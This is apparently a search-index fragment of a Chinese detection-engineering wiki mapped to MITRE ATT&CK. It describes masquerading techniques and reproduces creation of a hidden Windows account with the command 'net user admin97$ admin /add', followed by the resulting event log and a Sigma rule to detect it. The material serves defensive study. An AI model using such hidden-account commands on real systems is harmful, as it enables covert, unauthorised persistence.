https://attack.mitre.org/techniques/T1066/","title":"\u53c2\u8003\u63a8\u8350"},{"location":"0x7_%E9%80%83%E9%81%BF%E8%BF%BD%E8%B8%AA/T1036-win-%E9%9A%90%E8%97%8F%E7%94%A8%E6%88%B7%E8%B4%A6%E6%88%B7%E5%B8%A6%24%E7%AC%A6%E5%8F%B7/","text":"T1036-windows-\u9690\u85cf\u7528\u6237\u8d26\u6237\u5e26$\u7b26\u53f7 \u6765\u81eaATT&CK\u7684\u63cf\u8ff0 \u4f2a\u88c5\u6307\u7684\u662f\u653b\u51fb\u8005\u64cd\u7eb5\u6216\u6ee5\u7528\u53ef\u6267\u884c\u6587\u4ef6\uff08\u4e0d\u7ba1\u662f\u5408\u6cd5\u8fd8\u662f\u6076\u610f\u7684\uff09\u7684\u540d\u79f0\u6216\u4f4d\u7f6e\u6765\u9003\u907f\u9632\u5fa1\u548c\u89c2\u5bdf\u3002\u5df2\u7ecf\u53d1\u73b0\u4e86\u4ee5\u4e0b\u51e0\u79cd\u6280\u672f\u53d8\u4f53\uff1a \u4e00\u79cd\u53d8\u4f53\u662f\u5c06\u53ef\u6267\u884c\u6587\u4ef6\u653e\u5728\u901a\u5e38\u53d7\u4fe1\u4efb\u7684\u76ee\u5f55\u4e2d\uff0c\u6216\u8005\u5c06\u6587\u4ef6\u547d\u540d\u4e3a\u5408\u6cd5\u53d7\u4fe1\u4efb\u7a0b\u5e8f\u7684\u540d\u79f0\u3002\u53e6\u5916\uff0c\u4e5f\u53ef\u80fd\u5c06\u6587\u4ef6\u547d\u540d\u4e3a\u4e0e\u5408\u6cd5\u7a0b\u5e8f\u5f88\u76f8\u8fd1\u7684\u540d\u79f0\uff0c\u6216\u5176\u5b83\u65e0\u4f24\u5927\u96c5\u7684\u540d\u79f0\u3002\u6bd4\u5982\uff0c\u79fb\u52a8\u5e76\u91cd\u547d\u540d\u4e00\u4e2a\u516c\u5171\u7cfb\u7edf\u5b9e\u7528\u5de5\u5177\u6216\u7a0b\u5e8f\u6765\u89c4\u907f\u5176\u5bf9\u5176\u4f7f\u7528\u60c5\u51b5\u7684\u68c0\u6d4b\u3002\u8fd9\u6837\u505a\u662f\u4e3a\u4e86\u7ed5\u8fc7\u4f9d\u8d56\u6587\u4ef6\u540d\u6216\u8def\u5f84\u6765\u4fe1\u4efb\u53ef\u6267\u884c\u6587\u4ef6\u7684\u5de5\u5177\uff0c\u4ee5\u53ca\u901a\u8fc7\u5c06\u6587\u4ef6\u540d\u4e0e\u5176\u5b83\u5408\u6cd5\u4e8b\u7269\u76f8\u5173\u8054\u6765\u6b3a\u9a97\u9632\u5fa1\u7a0b\u5e8f\u548c\u7cfb\u7edf\u7ba1\u7406\u5458\u8ba4\u4e3a\u6587\u4ef6\u662f\u5584\u610f\u7684\u3002 \u53e6\u5916\u4e00\u79cd\u53d8\u4f53\u4f7f\u7528\u4ece\u53f3\u5411\u5de6\u8986\u76d6\uff08RTLO\u6216RLO\uff09\u5b57\u7b26\uff08U+202E\uff09\u7684\u65b9\u6cd5\u8bf1\u9a97\u7528\u6237\u6267\u884c\u4ed6\u4eec\u8ba4\u4e3a\u7684\u5584\u610f\u6587\u4ef6\u7c7b\u578b\u4f46\u5b9e\u9645\u4e0a\u662f\u53ef\u6267\u884c\u4ee3\u7801\u3002RTLO\u662f\u975e\u6253\u5370\u5b57\u7b26\uff0c\u5b83\u4f1a\u5bfc\u81f4\u540e\u9762\u7684\u6587\u672c\u53cd\u5411\u663e\u793a\u3002\u4f8b\u5982\uff0c\u4e00\u4e2a\u540d\u4e3aMarch 25 \\u202Excod.scr \u7684Windows\u5c4f\u5e55\u4fdd\u62a4\u7a0b\u5e8f\u6587\u4ef6\u5c06\u663e\u793a\u4e3aMarch 25 rcs.docx\uff0c\u540d\u4e3a photo_high_re\\u202Egnp.js \u7684JavaScript\u6587\u4ef6\u5c06\u663e\u793a\u4e3aphoto_high_resj.png\u3002\u8fd9\u79cd\u6280\u672f\u7684\u4e00\u4e2a\u5e38\u89c1\u505a\u6cd5\u662f\u4f7f\u7528\u7f51\u7edc\u9493\u9c7c\u653b\u51fb\u9644\u4ef6\uff0c\u56e0\u4e3a\u5b83\u53ef\u4ee5\u6b3a\u9a97\u90ae\u4ef6\u53cc\u65b9\u548c\u9632\u5fa1\u7a0b\u5e8f\uff0c\u5982\u679c\u6070\u597d\u4ed6\u4eec\u4e0d\u77e5\u9053\u81ea\u5df1\u7684\u5de5\u5177\u5982\u4f55\u663e\u793a\u548c\u5448\u73b0RTLO\u5b57\u7b26\u3002\u5728\u8bb8\u591a\u9488\u5bf9\u6027\u7684\u5165\u4fb5\u4f01\u56fe\u548c\u72af\u7f6a\u6d3b\u52a8\u4e2d\u90fd\u53ef\u4ee5\u770b\u5230RTLO\u5b57\u7b26\u7684\u4f7f\u7528\u3002RTLO\u4e5f\u53ef\u7528\u4e8eWindows\u6ce8\u518c\u8868\uff0c\u5176\u4e2dregedit.exe\u663e\u793a\u76f8\u53cd\u7684\u5b57\u7b26\uff0c\u4f46\u547d\u4ee4\u884c\u5de5\u5177reg.exe\u9ed8\u8ba4\u60c5\u51b5\u4e0b\u4e0d\u8fd9\u4e48\u663e\u793a\u3002 \u653b\u51fb\u8005\u53ef\u80fd\u4f1a\u4fee\u6539\u4e8c\u8fdb\u5236\u6587\u4ef6\u7684\u5143\u6570\u636e\uff0c\u5305\u62ec\u56fe\u6807\u3001\u7248\u672c\u3001\u4ea7\u54c1\u540d\u79f0\u3001\u63cf\u8ff0\u548c\u7248\u6743\u7b49\u5b57\u6bb5\uff0c\u4ee5\u4fbf\u66f4\u597d\u5730\u4e0e\u73af\u5883\u878d\u5408\uff0c\u589e\u52a0\u6b3a\u9a97\u5b89\u5168\u5206\u6790\u5e08\u6216\u4ea7\u54c1\u7684\u53ef\u80fd\u6027\u3002 Windows \u5728\u8fd9\u79cd\u6280\u672f\u7684\u53e6\u4e00\u79cd\u53d8\u4f53\u4e2d\uff0c\u653b\u51fb\u8005\u53ef\u80fd\u4f1a\u4f7f\u7528\u5408\u6cd5\u5b9e\u7528\u7a0b\u5e8f\u7684\u91cd\u547d\u540d\u526f\u672c\uff0c\u4f8b\u5982rundll32.exe\u3002\u53e6\u4e00\u79cd\u60c5\u51b5\u662f\uff0c\u5c06\u5408\u6cd5\u5b9e\u7528\u7a0b\u5e8f\u79fb\u52a8\u5230\u5176\u4ed6\u76ee\u5f55\u5e76\u91cd\u547d\u540d\u6765\u89c4\u907f\u4ece\u975e\u6807\u51c6\u8def\u5f84\u6267\u884c\u7684\u7cfb\u7edf\u5b9e\u7528\u7a0b\u5e8f\u7684\u68c0\u6d4b\u3002 \u4e3e\u4f8b\uff1aWindows\u4e2d\uff0c\u653b\u51fb\u8005\u4f1a\u6ee5\u7528\u53d7\u4fe1\u4efb\u4f4d\u7f6eC:\\Windows\\System32\uff0c\u4f1a\u628a\u6076\u610f\u4e8c\u8fdb\u5236\u6587\u4ef6\u547d\u540d\u4e3a\u53d7\u4fe1\u4efb\u4e8c\u8fdb\u5236\u540d\u79f0\u201cexplorer.exe\u201d\u548c\u201csvchost.exe\u201d\u3002 Linux \u6b64\u6280\u672f\u7684\u53e6\u4e00\u4e2a\u53d8\u4f53\u5305\u62ec\u6076\u610f\u4e8c\u8fdb\u5236\u6587\u4ef6\u542f\u52a8\u540e\uff08\u4e0e\u4ee5\u524d\u76f8\u53cd\uff09\u5c06\u8fd0\u884c\u8fdb\u7a0b\u7684\u540d\u79f0\u66f4\u6539\u4e3a\u53ef\u4fe1\u6216\u826f\u6027\u8fdb\u7a0b\u7684\u540d\u79f0\u3002 \u4e3e\u4f8b\uff1aLinux\u4e2d\uff0c\u653b\u51fb\u8005\u4f1a\u6ee5\u7528\u53d7\u4fe1\u4efb\u4f4d\u7f6e/bin\uff0c\u4f1a\u628a\u6076\u610f\u4e8c\u8fdb\u5236\u6587\u4ef6\u547d\u540d\u4e3a\u53d7\u4fe1\u4efb\u4e8c\u8fdb\u5236\u540d\u79f0\u201crsyncd\u201d\u548c\u201cdbus-inotifier\u201d \u6d4b\u8bd5\u6848\u4f8b \u5229\u7528net\u547d\u4ee4\u6dfb\u52a0\u7528\u6237\uff0c\u4fee\u6539\u7528\u6237\u4e3a\u9690\u85cf\u7528\u6237\uff0c\u9690\u85cf\u6548\u679c\uff0c\u4ec5NET USER\u547d\u4ee4\u4e0d\u53ef\u67e5\u627e\u3002 \u68c0\u6d4b\u65e5\u5fd7 windows security \u6d4b\u8bd5\u590d\u73b0 net user\u521b\u5efa\u7528\u6237 C:\\Windows\\system32>net user admin97$ admin /add \u547d\u4ee4\u6210\u529f\u5b8c\u6210\u3002 C:\\Windows\\system32>net user \\\\12306BR0-PC \u7684\u7528\u6237\u5e10\u6237 ------------------------------------------------------------------------------- 12306Br0 admin.098 admin.123 Administrator Guest \u547d\u4ee4\u6210\u529f\u5b8c\u6210\u3002 \u4fee\u6539\u7528\u6237 \u65e0\u6d4b\u8bd5\u573a\u666f\uff0c\u5f85\u8865\u5145 \u6d4b\u8bd5\u7559\u75d5 Event-ID:4720 \u5df2\u521b\u5efa\u7528\u6237\u5e10\u6237\u3002 \u4e3b\u9898: \u5b89\u5168 ID: 12306Br0-PC\\12306Br0 \u5e10\u6237\u540d: 12306Br0 \u5e10\u6237\u57df: 12306Br0-PC \u767b\u5f55 ID: 0x53e6a \u65b0\u5e10\u6237: \u5b89\u5168 ID: 12306Br0-PC\\admin97$ \u5e10\u6237\u540d: admin97$ \u5e10\u6237\u57df: 12306Br0-PC \u5c5e\u6027: SAM \u5e10\u6237\u540d: admin97$ \u663e\u793a\u540d\u79f0: <\u672a\u8bbe\u7f6e\u503c> \u7528\u6237\u4e3b\u4f53\u540d\u79f0: - \u4e3b\u76ee\u5f55: <\u672a\u8bbe\u7f6e\u503c> \u4e3b\u9a71\u52a8\u5668: <\u672a\u8bbe\u7f6e\u503c> \u811a\u672c\u8def\u5f84: <\u672a\u8bbe\u7f6e\u503c> \u914d\u7f6e\u6587\u4ef6\u8def\u5f84: <\u672a\u8bbe\u7f6e\u503c> \u7528\u6237\u5de5\u4f5c\u7ad9: <\u672a\u8bbe\u7f6e\u503c> \u4e0a\u6b21\u8bbe\u7f6e\u7684\u5bc6\u7801:<\u4ece\u4e0d> \u5e10\u6237\u8fc7\u671f: <\u4ece\u4e0d> \u4e3b\u8981\u7ec4 ID: 513 \u5141\u8bb8\u59d4\u6258\u7ed9: - \u65e7 UAC \u503c: 0x0 \u65b0 UAC \u503c: 0x15 \u7528\u6237\u5e10\u6237\u63a7\u5236: \u5df2\u7981\u7528\u7684\u5e10\u6237 '\u4e0d\u8981\u6c42\u5bc6\u7801' - \u5df2\u542f\u7528 '\u666e\u901a\u5e10\u6237' - \u5df2\u542f\u7528 \u7528\u6237\u53c2\u6570: <\u672a\u8bbe\u7f6e\u503c> SID \u5386\u53f2: - \u767b\u5f55\u65f6\u95f4(\u4ee5\u5c0f\u65f6\u8ba1):\u5168\u90e8 \u9644\u52a0\u4fe1\u606f: \u7279\u6743 - \u68c0\u6d4b\u89c4\u5219/\u601d\u8def sigma\u89c4\u5219 title: \u5728\u5c5e\u6027'SamAccountName'\u4e2d\u4f7f\u7528'$'\u7684\u65b0\u7528\u6237\u5e10\u6237\u6216\u91cd\u547d\u540d\u7528\u6237\u5e10\u6237 status: experimental description: \u901a\u8fc7\u5f02\u5e38\u7684\u7528\u6237\u5e10\u6237\u540d\u68c0\u6d4b\u53ef\u80fd\u7684\u65c1\u8defEDR\u548cSIEM\u3002 tags: - attack.defense_evasion - attack.t1036 author: 12306Br0(\u6d4b\u8bd5+\u7ffb\u8bd1) date: 2020/06/09 logsource: product: windows service: security detection: selection: EventID: - 4720 # \u521b\u5efa\u7528\u6237 - 4781 # \u4fee\u6539\u7528\u6237\u540d UserName|contains: '$' #Sam\u7528\u6237\u540d condition: selection fields: - EventID - UserName - SubjectAccountName falsepositives: - Unkown level: high \u5efa\u8bae \u6682\u65e0 \u53c2\u8003\u63a8\u8350 MITRE-ATT&CK-T1036 https://attack.mitre.org/techniques/T1036/","title":"T1036-windows-\u9690\u85cf\u7528\u6237\u8d26\u6237\u5e26$\u7b26\u53f7"},{"location":"0x7_%E9%80%83%E9%81%BF%E8%BF%BD%E8%B8%AA/T1036-win-%E9%9A%90%E8%97%8F%E7%94%A8%E6%88%B7%E8%B4%A6%E6%88%B7%E5%B8%A6%24%E7%AC%A6%E5%8F%B7/#t1036-windows-","text":"","title":"T1036-windows-\u9690\u85cf\u7528\u6237\u8d26\u6237\u5e26$\u7b26\u53f7"},{"location":"0x7_%E9%80%83%E9%81%BF%E8%BF%BD%E8%B8%AA/T1036-win-%E9%9A%90%E8%97%8F%E7%94%A8%E6%88%B7%E8%B4%A6%E6%88%B7%E5%B8%A6%24%E7%AC%A6%E5%8F%B7/#attck","text":"\u4f2a\u88c5\u6307\u7684\u662f\u653b\u51fb\u8005\u64cd\u7eb5\u6216\u6ee5\u7528\u53ef\u6267\u884c\u6587\u4ef6\uff08\u4e0d\u7ba1\u662f\u5408\u6cd5\u8fd8\u662f\u6076\u610f\u7684\uff09\u7684\u540d\u79f0\u6216\u4f4d\u7f6e\u6765\u9003\u907f\u9632\u5fa1\u548c\u89c2\u5bdf\u3002\u5df2\u7ecf\u53d1\u73b0\u4e86\u4ee5\u4e0b\u51e0\u79cd\u6280\u672f\u53d8\u4f53\uff1a \u4e00\u79cd\u53d8\u4f53\u662f\u5c06\u53ef\u6267\u884c\u6587\u4ef6\u653e\u5728\u901a\u5e38\u53d7\u4fe1\u4efb\u7684\u76ee\u5f55\u4e2d\uff0c\u6216\u8005\u5c06\u6587\u4ef6\u547d\u540d\u4e3a\u5408\u6cd5\u53d7\u4fe1\u4efb\u7a0b\u5e8f\u7684\u540d\u79f0\u3002\u53e6\u5916\uff0c\u4e5f\u53ef\u80fd\u5c06\u6587\u4ef6\u547d\u540d\u4e3a\u4e0e\u5408\u6cd5\u7a0b\u5e8f\u5f88\u76f8\u8fd1\u7684\u540d\u79f0\uff0c\u6216\u5176\u5b83\u65e0\u4f24\u5927\u96c5\u7684\u540d\u79f0\u3002\u6bd4\u5982\uff0c\u79fb\u52a8\u5e76\u91cd\u547d\u540d\u4e00\u4e2a\u516c\u5171\u7cfb\u7edf\u5b9e\u7528\u5de5\u5177\u6216\u7a0b\u5e8f\u6765\u89c4\u907f\u5176\u5bf9\u5176\u4f7f\u7528\u60c5\u51b5\u7684\u68c0\u6d4b\u3002\u8fd9\u6837\u505a\u662f\u4e3a\u4e86\u7ed5\u8fc7\u4f9d\u8d56\u6587\u4ef6\u540d\u6216\u8def\u5f84\u6765\u4fe1\u4efb\u53ef\u6267\u884c\u6587\u4ef6\u7684\u5de5\u5177\uff0c\u4ee5\u53ca\u901a\u8fc7\u5c06\u6587\u4ef6\u540d\u4e0e\u5176\u5b83\u5408\u6cd5\u4e8b\u7269\u76f8\u5173\u8054\u6765\u6b3a\u9a97\u9632\u5fa1\u7a0b\u5e8f\u548c\u7cfb\u7edf\u7ba1\u7406\u5458\u8ba4\u4e3a\u6587\u4ef6\u662f\u5584\u610f\u7684\u3002 \u53e6\u5916\u4e00\u79cd\u53d8\u4f53\u4f7f\u7528\u4ece\u53f3\u5411\u5de6\u8986\u76d6\uff08RTLO\u6216RLO\uff09\u5b57\u7b26\uff08U+202E\uff09\u7684\u65b9\u6cd5\u8bf1\u9a97\u7528\u6237\u6267\u884c\u4ed6\u4eec\u8ba4\u4e3a\u7684\u5584\u610f\u6587\u4ef6\u7c7b\u578b\u4f46\u5b9e\u9645\u4e0a\u662f\u53ef\u6267\u884c\u4ee3\u7801\u3002RTLO\u662f\u975e\u6253\u5370\u5b57\u7b26\uff0c\u5b83\u4f1a\u5bfc\u81f4\u540e\u9762\u7684\u6587\u672c\u53cd\u5411\u663e\u793a\u3002\u4f8b\u5982\uff0c\u4e00\u4e2a\u540d\u4e3aMarch 25 \\u202Excod.scr \u7684Windows\u5c4f\u5e55\u4fdd\u62a4\u7a0b\u5e8f\u6587\u4ef6\u5c06\u663e\u793a\u4e3aMarch 25 rcs.docx\uff0c\u540d\u4e3a photo_high_re\\u202Egnp.js \u7684JavaScript\u6587\u4ef6\u5c06\u663e\u793a\u4e3aphoto_high_resj.png\u3002\u8fd9\u79cd\u6280\u672f\u7684\u4e00\u4e2a\u5e38\u89c1\u505a\u6cd5\u662f\u4f7f\u7528\u7f51\u7edc\u9493\u9c7c\u653b\u51fb\u9644\u4ef6\uff0c\u56e0\u4e3a\u5b83\u53ef\u4ee5\u6b3a\u9a97\u90ae\u4ef6\u53cc\u65b9\u548c\u9632\u5fa1\u7a0b\u5e8f\uff0c\u5982\u679c\u6070\u597d\u4ed6\u4eec\u4e0d\u77e5\u9053\u81ea\u5df1\u7684\u5de5\u5177\u5982\u4f55\u663e\u793a\u548c\u5448\u73b0RTLO\u5b57\u7b26\u3002\u5728\u8bb8\u591a\u9488\u5bf9\u6027\u7684\u5165\u4fb5\u4f01\u56fe\u548c\u72af\u7f6a\u6d3b\u52a8\u4e2d\u90fd\u53ef\u4ee5\u770b\u5230RTLO\u5b57\u7b26\u7684\u4f7f\u7528\u3002RTLO\u4e5f\u53ef\u7528\u4e8eWindows\u6ce8\u518c\u8868\uff0c\u5176\u4e2dregedit.exe\u663e\u793a\u76f8\u53cd\u7684\u5b57\u7b26\uff0c\u4f46\u547d\u4ee4\u884c\u5de5\u5177reg.exe\u9ed8\u8ba4\u60c5\u51b5\u4e0b\u4e0d\u8fd9\u4e48\u663e\u793a\u3002 \u653b\u51fb\u8005\u53ef\u80fd\u4f1a\u4fee\u6539\u4e8c\u8fdb\u5236\u6587\u4ef6\u7684\u5143\u6570\u636e\uff0c\u5305\u62ec\u56fe\u6807\u3001\u7248\u672c\u3001\u4ea7\u54c1\u540d\u79f0\u3001\u63cf\u8ff0\u548c\u7248\u6743\u7b49\u5b57\u6bb5\uff0c\u4ee5\u4fbf\u66f4\u597d\u5730\u4e0e\u73af\u5883\u878d\u5408\uff0c\u589e\u52a0\u6b3a\u9a97\u5b89\u5168\u5206\u6790\u5e08\u6216\u4ea7\u54c1\u7684\u53ef\u80fd\u6027\u3002","title":"\u6765\u81eaATT&amp;CK\u7684\u63cf\u8ff0"},{"location":"0x7_%E9%80%83%E9%81%BF%E8%BF%BD%E8%B8%AA/T1036-win-%E9%9A%90%E8%97%8F%E7%94%A8%E6%88%B7%E8%B4%A6%E6%88%B7%E5%B8%A6%24%E7%AC%A6%E5%8F%B7/#windows","text":"\u5728\u8fd9\u79cd\u6280\u672f\u7684\u53e6\u4e00\u79cd\u53d8\u4f53\u4e2d\uff0c\u653b\u51fb\u8005\u53ef\u80fd\u4f1a\u4f7f\u7528\u5408\u6cd5\u5b9e\u7528\u7a0b\u5e8f\u7684\u91cd\u547d\u540d\u526f\u672c\uff0c\u4f8b\u5982rundll32.exe\u3002\u53e6\u4e00\u79cd\u60c5\u51b5\u662f\uff0c\u5c06\u5408\u6cd5\u5b9e\u7528\u7a0b\u5e8f\u79fb\u52a8\u5230\u5176\u4ed6\u76ee\u5f55\u5e76\u91cd\u547d\u540d\u6765\u89c4\u907f\u4ece\u975e\u6807\u51c6\u8def\u5f84\u6267\u884c\u7684\u7cfb\u7edf\u5b9e\u7528\u7a0b\u5e8f\u7684\u68c0\u6d4b\u3002 \u4e3e\u4f8b\uff1aWindows\u4e2d\uff0c\u653b\u51fb\u8005\u4f1a\u6ee5\u7528\u53d7\u4fe1\u4efb\u4f4d\u7f6eC:\\Windows\\System32\uff0c\u4f1a\u628a\u6076\u610f\u4e8c\u8fdb\u5236\u6587\u4ef6\u547d\u540d\u4e3a\u53d7\u4fe1\u4efb\u4e8c\u8fdb\u5236\u540d\u79f0\u201cexplorer.exe\u201d\u548c\u201csvchost.exe\u201d\u3002","title":"Windows"},{"location":"0x7_%E9%80%83%E9%81%BF%E8%BF%BD%E8%B8%AA/T1036-win-%E9%9A%90%E8%97%8F%E7%94%A8%E6%88%B7%E8%B4%A6%E6%88%B7%E5%B8%A6%24%E7%AC%A6%E5%8F%B7/#linux","text":"\u6b64\u6280\u672f\u7684\u53e6\u4e00\u4e2a\u53d8\u4f53\u5305\u62ec\u6076\u610f\u4e8c\u8fdb\u5236\u6587\u4ef6\u542f\u52a8\u540e\uff08\u4e0e\u4ee5\u524d\u76f8\u53cd\uff09\u5c06\u8fd0\u884c\u8fdb\u7a0b\u7684\u540d\u79f0\u66f4\u6539\u4e3a\u53ef\u4fe1\u6216\u826f\u6027\u8fdb\u7a0b\u7684\u540d\u79f0\u3002 \u4e3e\u4f8b\uff1aLinux\u4e2d\uff0c\u653b\u51fb\u8005\u4f1a\u6ee5\u7528\u53d7\u4fe1\u4efb\u4f4d\u7f6e/bin\uff0c\u4f1a\u628a\u6076\u610f\u4e8c\u8fdb\u5236\u6587\u4ef6\u547d\u540d\u4e3a\u53d7\u4fe1\u4efb\u4e8c\u8fdb\u5236\u540d\u79f0\u201crsyncd\u201d\u548c\u201cdbus-inotifier\u201d","title":"Linux"},{"location":"0x7_%E9%80%83%E9%81%BF%E8%BF%BD%E8%B8%AA/T1036-win-%E9%9A%90%E8%97%8F%E7%94%A8%E6%88%B7%E8%B4%A6%E6%88%B7%E5%B8%A6%24%E7%AC%A6%E5%8F%B7/#_1","text":"\u5229\u7528net\u547d\u4ee4\u6dfb\u52a0\u7528\u6237\uff0c\u4fee\u6539\u7528\u6237\u4e3a\u9690\u85cf\u7528\u6237\uff0c\u9690\u85cf\u6548\u679c\uff0c\u4ec5NET USER\u547d\u4ee4\u4e0d\u53ef\u67e5\u627e\u3002","title":"\u6d4b\u8bd5\u6848\u4f8b"},{"location":"0x7_%E9%80%83%E9%81%BF%E8%BF%BD%E8%B8%AA/T1036-win-%E9%9A%90%E8%97%8F%E7%94%A8%E6%88%B7%E8%B4%A6%E6%88%B7%E5%B8%A6%24%E7%AC%A6%E5%8F%B7/#_2","text":"windows security","title":"\u68c0\u6d4b\u65e5\u5fd7"},{"location":"0x7_%E9%80%83%E9%81%BF%E8%BF%BD%E8%B8%AA/T1036-win-%E9%9A%90%E8%97%8F%E7%94%A8%E6%88%B7%E8%B4%A6%E6%88%B7%E5%B8%A6%24%E7%AC%A6%E5%8F%B7/#_3","text":"","title":"\u6d4b\u8bd5\u590d\u73b0"},{"location":"0x7_%E9%80%83%E9%81%BF%E8%BF%BD%E8%B8%AA/T1036-win-%E9%9A%90%E8%97%8F%E7%94%A8%E6%88%B7%E8%B4%A6%E6%88%B7%E5%B8%A6%24%E7%AC%A6%E5%8F%B7/#net-user","text":"C:\\Windows\\system32>net user admin97$ admin /add \u547d\u4ee4\u6210\u529f\u5b8c\u6210\u3002 C:\\Windows\\system32>net user \\\\12306BR0-PC \u7684\u7528\u6237\u5e10\u6237 ------------------------------------------------------------------------------- 12306Br0 admin.098 admin.123 Administrator Guest \u547d\u4ee4\u6210\u529f\u5b8c\u6210\u3002","title":"net user\u521b\u5efa\u7528\u6237"},{"location":"0x7_%E9%80%83%E9%81%BF%E8%BF%BD%E8%B8%AA/T1036-win-%E9%9A%90%E8%97%8F%E7%94%A8%E6%88%B7%E8%B4%A6%E6%88%B7%E5%B8%A6%24%E7%AC%A6%E5%8F%B7/#_4","text":"\u65e0\u6d4b\u8bd5\u573a\u666f\uff0c\u5f85\u8865\u5145","title":"\u4fee\u6539\u7528\u6237"},{"location":"0x7_%E9%80%83%E9%81%BF%E8%BF%BD%E8%B8%AA/T1036-win-%E9%9A%90%E8%97%8F%E7%94%A8%E6%88%B7%E8%B4%A6%E6%88%B7%E5%B8%A6%24%E7%AC%A6%E5%8F%B7/#_5","text":"","title":"\u6d4b\u8bd5\u7559\u75d5"},{"location":"0x7_%E9%80%83%E9%81%BF%E8%BF%BD%E8%B8%AA/T1036-win-%E9%9A%90%E8%97%8F%E7%94%A8%E6%88%B7%E8%B4%A6%E6%88%B7%E5%B8%A6%24%E7%AC%A6%E5%8F%B7/#event-id4720","text":"\u5df2\u521b\u5efa\u7528\u6237\u5e10\u6237\u3002 \u4e3b\u9898: \u5b89\u5168 ID: 12306Br0-PC\\12306Br0 \u5e10\u6237\u540d: 12306Br0 \u5e10\u6237\u57df: 12306Br0-PC \u767b\u5f55 ID: 0x53e6a \u65b0\u5e10\u6237: \u5b89\u5168 ID: 12306Br0-PC\\admin97$ \u5e10\u6237\u540d: admin97$ \u5e10\u6237\u57df: 12306Br0-PC \u5c5e\u6027: SAM \u5e10\u6237\u540d: admin97$ \u663e\u793a\u540d\u79f0: <\u672a\u8bbe\u7f6e\u503c> \u7528\u6237\u4e3b\u4f53\u540d\u79f0: - \u4e3b\u76ee\u5f55: <\u672a\u8bbe\u7f6e\u503c> \u4e3b\u9a71\u52a8\u5668: <\u672a\u8bbe\u7f6e\u503c> \u811a\u672c\u8def\u5f84: <\u672a\u8bbe\u7f6e\u503c> \u914d\u7f6e\u6587\u4ef6\u8def\u5f84: <\u672a\u8bbe\u7f6e\u503c> \u7528\u6237\u5de5\u4f5c\u7ad9: <\u672a\u8bbe\u7f6e\u503c> \u4e0a\u6b21\u8bbe\u7f6e\u7684\u5bc6\u7801:<\u4ece\u4e0d> \u5e10\u6237\u8fc7\u671f: <\u4ece\u4e0d> \u4e3b\u8981\u7ec4 ID: 513 \u5141\u8bb8\u59d4\u6258\u7ed9: - \u65e7 UAC \u503c: 0x0 \u65b0 UAC \u503c: 0x15 \u7528\u6237\u5e10\u6237\u63a7\u5236: \u5df2\u7981\u7528\u7684\u5e10\u6237 '\u4e0d\u8981\u6c42\u5bc6\u7801' - \u5df2\u542f\u7528 '\u666e\u901a\u5e10\u6237' - \u5df2\u542f\u7528 \u7528\u6237\u53c2\u6570: <\u672a\u8bbe\u7f6e\u503c> SID \u5386\u53f2: - \u767b\u5f55\u65f6\u95f4(\u4ee5\u5c0f\u65f6\u8ba1):\u5168\u90e8 \u9644\u52a0\u4fe1\u606f: \u7279\u6743 -","title":"Event-ID:4720"},{"location":"0x7_%E9%80%83%E9%81%BF%E8%BF%BD%E8%B8%AA/T1036-win-%E9%9A%90%E8%97%8F%E7%94%A8%E6%88%B7%E8%B4%A6%E6%88%B7%E5%B8%A6%24%E7%AC%A6%E5%8F%B7/#_6","text":"","title":"\u68c0\u6d4b\u89c4\u5219/\u601d\u8def"},{"location":"0x7_%E9%80%83%E9%81%BF%E8%BF%BD%E8%B8%AA/T1036-win-%E9%9A%90%E8%97%8F%E7%94%A8%E6%88%B7%E8%B4%A6%E6%88%B7%E5%B8%A6%24%E7%AC%A6%E5%8F%B7/#sigma","text":"title: \u5728\u5c5e\u6027'SamAccountName'\u4e2d\u4f7f\u7528'$'\u7684\u65b0\u7528\u6237\u5e10\u6237\u6216\u91cd\u547d\u540d\u7528\u6237\u5e10\u6237 status: experimental description: \u901a\u8fc7\u5f02\u5e38\u7684\u7528\u6237\u5e10\u6237\u540d\u68c0\u6d4b\u53ef\u80fd\u7684\u65c1\u8defEDR\u548cSIEM\u3002 tags: - attack.defense_evasion - attack.t1036 author: 12306Br0(\u6d4b\u8bd5+\u7ffb\u8bd1) date: 2020/06/09 logsource: product: windows service: security detection: selection: EventID: - 4720 # \u521b\u5efa\u7528\u6237 - 4781 # \u4fee\u6539\u7528\u6237\u540d UserName|contains: '$' #Sam\u7528\u6237\u540d condition: selection fields: - EventID - UserName - SubjectAccountName falsepositives: - Unkown level: high","title":"sigma\u89c4\u5219"},{"location":"0x7_%E9%80%83%E9%81%BF%E8%BF%BD%E8%B8%AA/T1036-win-%E9%9A%90%E8%97%8F%E7%94%A8%E6%88%B7%E8%B4%A6%E6%88%B7%E5%B8%A6%24%E7%AC%A6%E5%8F%B7/#_7","text":"\u6682\u65e0","title":"\u5efa\u8bae"},{"location":"0x7_%E9%80%83%E9%81%BF%E8%BF%BD%E8%B8%AA/T1036-win-%E9%9A%90%E8%97%8F%E7%94%A8%E6%88%B7%E8%B4%A6%E6%88%B7%E5%B8%A6%24%E7%AC%A6%E5%8F%B7/#_8","text":"MITRE-ATT&CK-T1036 https://attack.mitre.org/techniques/T1036/","title":"\u53c2\u8003\u63a8\u8350"},{"location":"0x7_%E9%80%83%E9%81%BF%E8%BF%BD%E8%B8%AA/T1070-001-win-%E4%BD%BF%E7%94%A8wevtutil%E5%91%BD%E4%BB%A4%E5%88%A0%E9%99%A4%E6%97%A5%E5%BF%97/","text":"T1070-001-win-\u4f7f\u7528wevtutil\u547d\u4ee4\u5220\u9664\u65e5\u5fd7 \u6765\u81eaATT&CK\u7684\u63cf\u8ff0 \u653b\u51fb\u8005\u53ef\u80fd\u8bd5\u56fe\u963b\u6b62\u7531\u76d1\u6d4b\u8f6f\u4ef6\u6216\u8fdb\u7a0b\u6355\u83b7\u5230\u7684\u544a\u8b66\uff0c\u4ee5\u53ca\u4e8b\u4ef6\u65e5\u5fd7\u88ab\u6536\u96c6\u548c\u5206\u6790\u3002\u8fd9\u53ef\u80fd\u5305\u62ec\u4fee\u6539\u914d\u7f6e\u6587\u4ef6\u6216\u6ce8\u518c\u8868\u9879\u4e2d\u7684\u76d1\u6d4b\u8f6f\u4ef6\u7684\u8bbe\u7f6e\uff0c\u4ee5\u8fbe\u5230\u9003\u907f\u8ffd\u8e2a\u7684\u76ee\u7684\u3002 